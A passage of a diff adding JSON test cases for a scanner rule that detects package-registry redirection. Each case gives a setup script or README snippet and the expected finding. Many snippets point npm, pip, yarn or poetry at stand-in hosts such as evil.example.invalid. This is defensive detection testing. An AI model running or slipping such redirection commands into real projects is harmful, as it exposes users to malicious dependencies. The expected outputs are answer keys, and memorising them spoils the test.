+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-659e8403fa40",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source add private https://evil.example.invalid/simple --priority explicit\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-6759742786f7",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<EN\\D\nregistry=https://packages.example.invalid\nEND\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-6c82003c0a1c",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set npmPublishRegistry https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-6d5ed7a17939",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config set global.index-url https://a.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-6d782a90b43e",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n( npm config set registry https://a.invalid )\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-6fd1e3485b0f",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n\"npm\" config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-7013ce79e7c2",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config get registry\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-71bc8c9b3586",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ngrep -q 'npm config set registry' setup.sh\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-73ea373fd4bd",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nfalse || npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-79462348bf28",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://a.invalid;echo done\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-79f40a258ae9",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > \"$HOME/.npmrc\" <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-7bcf91445ef7",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsudo -E pip config set global.index-url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-80fb0146d57b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n{ npm config set registry https://a.invalid; }\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-82dfb54d77c8",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm ping --registry=https://packages.example.invalid\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-854076c770ef",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n``` bash\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-859454201f44",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n```Bash\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-8bcac9116a20",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n```bash title=\"setup.sh\"\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-8c66f8a627b9",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set \"registry\" \"https://packages.example.invalid\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-8df044dc9831",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nURL=https://a.invalid\nnpm config set registry \"$URL\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-8e02e0e2e87b",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source remove private\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-8f6f212c87bf",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://a.invalid | tee log.txt\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-8f81697e066c",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nREG=https://packages.example.invalid\nnpm config set registry \"$REG\"\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-9170eb95a28e",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nyarn config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "yarn",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-936d99388c13",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip install -i https://evil.example.invalid/simple requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "invocation",
+          "operation": "use",
+          "scope": "invocation",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-93fbf10107eb",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<${VAR:-x}\nregistry=https://packages.example.invalid\n${VAR:-x}\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-944899a5b6d2",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > ~/.npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-97786d6c1d2a",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-980d1a30b6f4",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho hi |\n  npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-9b67ddee564e",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n(npm config set registry https://packages.example.invalid)\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-a003e8d65532",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n# npm config set registry https://a.invalid\necho done\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-a6854abd8ea3",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho \"pip config set global.index-url https://evil.example.invalid/simple\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-a6fafa828f57",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nexport NPM_CONFIG_REGISTRY=https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-a7ff468995b6",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\necho \"npm config set registry https://a.invalid\"\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-a8b8dca121b5",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncd /work && npm config set registry https://packages.example.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-ab2467b159c6",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nNPM_CONFIG_REGISTRY=https://packages.example.invalid npm install\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-ad4c53906048",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config set global.index-url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-affe10056482",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat 0<<EOF > .npmrc\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-b085cfedf8d8",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://a.invalid   # point at mirror\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-b2c0a00639c7",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source add --default private https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-b7c84b6b73c3",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://a.invalid >/dev/null 2>&1\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-b7f661f33e27",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-b8e042e063bf",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "README.md": "# d\nRun npm config set registry https://packages.example.invalid/ to switch mirrors.\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-b9b06649472f",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nmvn -Dmaven.repo.remote=https://repo1.maven.org/maven2 package\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-bb7d2047451f",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\r\nnpm config set registry https://a.invalid\r\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-bbe13f886c21",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry source add private https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "add",
+          "scope": "source",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-be275dcc6e16",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm config set registry https://packages.example.invalid --userconfig ./.npmrc\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-c5745da3b858",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n# pip config set global.index-url https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-c603893923b7",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm_config_registry=https://packages.example.invalid npm install\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-c63a2ab801a5",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "inert",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nnpm help config\n"
+      },
+      "expected_sc10": []
+    },
+    {
+      "id": "control-executable-c6dcda944096",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npip config set global.index-url https://evil.example.invalid/simple >/dev/null 2>&1\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-c81fd8a927c2",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat >> .npmrc <<EOF\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-c9adad9736a3",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# Setup\n```bash\npip config set global.index-url https://evil.example.invalid/simple\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-ca5447f9668d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nPIP_INDEX_URL=https://evil.example.invalid/simple pip install requests\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-caf3bccc61a1",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat <<EOF > .npmrc\nregistry=https://packages.example.invalid\nEOF\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-cbf0536983c5",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nexport PIP_INDEX_URL=https://evil.example.invalid/simple\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "pip",
+          "surface": "environment",
+          "operation": "set",
+          "scope": "environment",
+          "destination": "https://evil.example.invalid/REDACTED_PATH",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-cdedb8e898c4",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\ncat > .npmrc <<$'END'\nregistry=https://packages.example.invalid\nEND\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "generated-config",
+          "operation": "replace",
+          "scope": "global",
+          "destination": "https://packages.example.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-cf7e0912afe9",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\n\tnpm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-d0dcfe827175",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\npoetry config repositories.private https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "poetry",
+          "surface": "command",
+          "operation": "set",
+          "scope": "repository",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-d10454ae83f5",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "README.md": "# d\n```console\nnpm config set registry https://packages.example.invalid/\n```\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://packages.example.invalid/",
+          "destination_status": "resolved",
+          "file": "README.md",
+          "start_line": 3
+        }
+      ]
+    },
+    {
+      "id": "control-executable-d2d719b6690d",
+      "status": "fixed",
+      "lands_in": "PR-2",
+      "expected_outcome": "finding",
+      "files": {
+        "scripts/setup.sh": "#!/bin/bash\nsudo -- npm config set registry https://a.invalid\n"
+      },
+      "expected_sc10": [
+        {
+          "severity": "HIGH",
+          "ecosystem": "npm",
+          "surface": "command",
+          "operation": "set",
+          "scope": "global",
+          "destination": "https://a.invalid",
+          "destination_status": "resolved",
+          "file": "scripts/setup.sh",
+          "start_line": 2
+        }
+      ]
+    },
+    {
+      "id": "control-executable-d476346c2e2d",
+      "status": "fixed",
